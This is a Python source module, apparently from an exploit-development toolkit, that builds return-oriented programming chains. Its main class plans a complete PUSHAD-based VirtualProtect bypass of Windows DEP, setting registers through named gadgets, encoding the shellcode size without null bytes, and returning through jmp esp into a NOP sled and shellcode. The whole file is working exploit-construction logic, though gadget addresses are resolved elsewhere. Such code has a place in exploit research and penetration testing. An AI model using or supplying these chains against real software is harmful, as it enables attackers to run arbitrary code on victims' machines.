"""
ROP chain builders — symbolic planning, no address resolution.

RopChain
    Generic builder: append any ChainElement via fluent push_* methods.

VirtualProtectChain
    Plans a complete PUSHAD-based VirtualProtect DEP bypass.

    PUSHAD register layout
    ----------------------
    PUSHAD pushes all eight general-purpose registers in this order
    (highest address to lowest on the stack):
        EAX, ECX, EDX, EBX, (pre-PUSHAD) ESP, EBP, ESI, EDI

    After ``pushad; ret`` the ret pops EDI into EIP.  The chain sets:
        EDI = ptr_to_ret  — executes one more ret, landing on ESI
        ESI = VirtualProtect — called as the next instruction after the second ret
        EBP = jmp_esp gadget — return address used by VirtualProtect (stdcall)
        pre-PUSHAD ESP = lpAddress — the address of the pushad gadget's next
                         element (the ShellcodePtr), which equals shellcode base
        EBX = dwSize (shellcode size, encoded null-free via negation)
        EDX = flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
        ECX = lpflOldProtect (writable static dword)
        EAX = 0x90909090 (NOP filler; becomes NOP sled at VirtualProtect return)

    After VirtualProtect returns to EBP (jmp esp), ESP points into the
    executable shellcode region.  Prepend the shellcode with a short NOP sled
    to absorb the few-byte offset introduced by the PUSHAD frame cleanup.

    Required gadget DB keys
    -----------------------
    pop_edi_ret, ptr_to_ret, pop_esi_ret, virtualprotect_ptr,
    pop_ebp_ret, jmp_esp, pop_eax_ret, neg_eax_ret, xchg_eax_ebx_ret,
    pop_edx_ret, pop_ecx_ret, pushad_ret, writable_ptr
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field

from Tools.rop.models import (
    ChainElement,
    GadgetRef,
    PaddingBlock,
    RawDword,
    ShellcodePtr,
    WritablePtr,
)

# PAGE_EXECUTE_READWRITE — the most common DEP bypass protection constant
_PAGE_EXECUTE_READWRITE: int = 0x40
# PAGE_EXECUTE — minimal; use when shellcode does not need to write itself
_PAGE_EXECUTE: int = 0x20

_EXECUTABLE_FLAGS: frozenset[int] = frozenset({_PAGE_EXECUTE, _PAGE_EXECUTE_READWRITE, 0x80})

#: Gadget names that VirtualProtectChain.plan() references.
VIRTUALPROTECT_REQUIRED_GADGETS: frozenset[str] = frozenset({
    "pop_edi_ret",         # pop edi; ret
    "ptr_to_ret",          # any address containing a ret (skeleton trampoline)
    "pop_esi_ret",         # pop esi; ret
    "virtualprotect_ptr",  # address of VirtualProtect (IAT entry or resolved)
    "pop_ebp_ret",         # pop ebp; ret
    "jmp_esp",             # jmp esp
    "pop_eax_ret",         # pop eax; ret  (used twice: neg trick + NOP filler)
    "neg_eax_ret",         # neg eax; ret
    "xchg_eax_ebx_ret",    # xchg eax, ebx; ret
    "pop_edx_ret",         # pop edx; ret
    "pop_ecx_ret",         # pop ecx; ret
    "pushad_ret",          # pushad; ret
    "writable_ptr",        # static writable dword (lpflOldProtect destination)
})


# ── Generic builder ──────────────────────────────────────────────────────────


@dataclass
class RopChain:
    """
    Generic ROP chain builder.

    All push_* methods return *self* for fluent chaining::

        chain = (
            RopChain()
            .push_gadget("pop_eax_ret", "load EAX")
            .push_dword(0x41414141, "placeholder")
            .push_shellcode_ptr("return target")
        )
    """

    _elements: list[ChainElement] = field(default_factory=list, init=False)

    # ── Append methods ────────────────────────────────────────────────────

    def push_gadget(self, name: str, purpose: str = "") -> RopChain:
        self._elements.append(GadgetRef(name, purpose))
        return self

    def push_dword(self, value: int, purpose: str = "") -> RopChain:
        self._elements.append(RawDword(value, purpose))
        return self

    def push_writable(self, name: str, purpose: str = "") -> RopChain:
        self._elements.append(WritablePtr(name, purpose))
        return self

    def push_shellcode_ptr(self, purpose: str = "shellcode address") -> RopChain:
        self._elements.append(ShellcodePtr(purpose))
        return self

    def push_padding(
        self,
        count: int = 1,
        value: int = 0x41414141,
        purpose: str = "padding",
    ) -> RopChain:
        self._elements.append(PaddingBlock(count, value, purpose))
        return self

    def extend(self, other: RopChain) -> RopChain:
        """Append all elements from *other* into this chain."""
        self._elements.extend(other._elements)
        return self

    # ── Inspection ────────────────────────────────────────────────────────

    def elements(self) -> list[ChainElement]:
        """Return a shallow copy of the element list."""
        return list(self._elements)

    def dword_count(self) -> int:
        """Total number of 4-byte slots (PaddingBlock expands to *count* slots)."""
        total = 0
        for elem in self._elements:
            total += elem.count if isinstance(elem, PaddingBlock) else 1
        return total

    def byte_length(self) -> int:
        return self.dword_count() * 4

    def __len__(self) -> int:
        return len(self._elements)

    def __repr__(self) -> str:
        return f"RopChain({len(self._elements)} elements, {self.byte_length()} bytes)"


# ── VirtualProtect planner ───────────────────────────────────────────────────


class VirtualProtectChain:
    """
    Plans a PUSHAD-based VirtualProtect DEP bypass ROP chain.

    Parameters
    ----------
    shellcode_size:
        Size in bytes of the shellcode region to mark executable.
        Defaults to 0x201 (513 bytes), which is null-free after negation.
        Values whose negation contains a null byte will be flagged by
        ChainValidator when ``bad_chars`` includes ``b"\\x00"``.
    protect_flags:
        Memory protection constant.  Must be one of:
        ``0x20`` (PAGE_EXECUTE), ``0x40`` (PAGE_EXECUTE_READWRITE),
        ``0x80`` (PAGE_EXECUTE_WRITECOPY).
    """

    REQUIRED_GADGETS: frozenset[str] = VIRTUALPROTECT_REQUIRED_GADGETS

    def __init__(
        self,
        shellcode_size: int = 0x201,
        protect_flags: int = _PAGE_EXECUTE_READWRITE,
    ) -> None:
        if shellcode_size <= 0:
            raise ValueError(
                f"shellcode_size must be > 0, got {shellcode_size!r}"
            )
        if protect_flags not in _EXECUTABLE_FLAGS:
            flags_str = ", ".join(f"{f:#x}" for f in sorted(_EXECUTABLE_FLAGS))
            raise ValueError(
                f"protect_flags {protect_flags:#x} is not a recognised executable "
                f"protection constant.  Valid values: {flags_str}"
            )
        self.shellcode_size = shellcode_size
        self.protect_flags = protect_flags

    def plan(self) -> list[ChainElement]:
        """
        Return the symbolic ROP chain as a list of ChainElement.

        No gadget addresses are resolved here; pass the result to
        ChainValidator and ChainSerializer.
        """
        neg_size = (-self.shellcode_size) & 0xFFFFFFFF

        chain: list[ChainElement] = [
            # ── Set up registers for PUSHAD ───────────────────────────────────
            #
            # EDI: skeleton ret — after PUSHAD's ret lands here, one more ret
            # hops to ESI (VirtualProtect) with the correct argument frame
            GadgetRef("pop_edi_ret",
                       "load skeleton-ret pointer into EDI"),
            GadgetRef("ptr_to_ret",
                       "EDI ← address of any ret instruction (PUSHAD trampoline)"),

            # ESI: VirtualProtect function address (called via the two-ret hop)
            GadgetRef("pop_esi_ret",
                       "load VirtualProtect address into ESI"),
            GadgetRef("virtualprotect_ptr",
                       "ESI ← VirtualProtect (IAT entry or resolved function)"),

            # EBP: return target after VirtualProtect returns (jmp esp → shellcode)
            GadgetRef("pop_ebp_ret",
                       "load jmp-esp gadget into EBP"),
            GadgetRef("jmp_esp",
                       "EBP ← jmp esp (VirtualProtect return target → shellcode)"),

            # EBX: shellcode size via null-free negation trick
            #   1. pop_eax: EAX ← neg(size)
            #   2. neg_eax: EAX ← size
            #   3. xchg:    EBX ← size, EAX ← old EBX (don't care)
            GadgetRef("pop_eax_ret",
                       f"load negated size ({neg_size:#010x}) into EAX"),
            RawDword(neg_size,
                     f"EAX ← neg({self.shellcode_size:#x}) — null-free size encoding"),
            GadgetRef("neg_eax_ret",
                       f"EAX ← {self.shellcode_size:#x} (shellcode size)"),
            GadgetRef("xchg_eax_ebx_ret",
                       "EBX ← shellcode size (via xchg eax, ebx)"),

            # EDX: flNewProtect
            GadgetRef("pop_edx_ret",
                       "load flNewProtect into EDX"),
            RawDword(self.protect_flags,
                     f"EDX ← {self.protect_flags:#x} (PAGE_EXECUTE_READWRITE)"),

            # ECX: lpflOldProtect (writable static location)
            GadgetRef("pop_ecx_ret",
                       "load writable-ptr address into ECX"),
            WritablePtr("writable_ptr",
                        "ECX ← lpflOldProtect (static writable dword)"),

            # EAX: 0x90909090 — NOP sled filler.
            # After PUSHAD the EAX slot lands a few bytes before the shellcode
            # base; setting it to NOPs (0x90) means jmp esp enters a sled.
            GadgetRef("pop_eax_ret",
                       "load NOP filler into EAX"),
            RawDword(0x90909090,
                     "EAX ← 0x90909090 (NOP fill — sled at VirtualProtect return)"),

            # ── PUSHAD → triggers VirtualProtect call ─────────────────────────
            # pushad saves all regs to stack, ret hops to EDI (ptr_to_ret),
            # which then rets to ESI (VirtualProtect).
            GadgetRef("pushad_ret",
                       "pushad + ret → EDI (ptr_to_ret) → ret → ESI (VirtualProtect)"),

            # ── Shellcode follows immediately ─────────────────────────────────
            # The pre-PUSHAD value of ESP equals this element's address,
            # which VirtualProtect receives as lpAddress.
            ShellcodePtr("shellcode base — pre-PUSHAD ESP == lpAddress arg to VirtualProtect"),
        ]
        return chain

    def _neg_size_has_null(self) -> bool:
        neg = (-self.shellcode_size) & 0xFFFFFFFF
        return 0 in struct.pack("<I", neg)
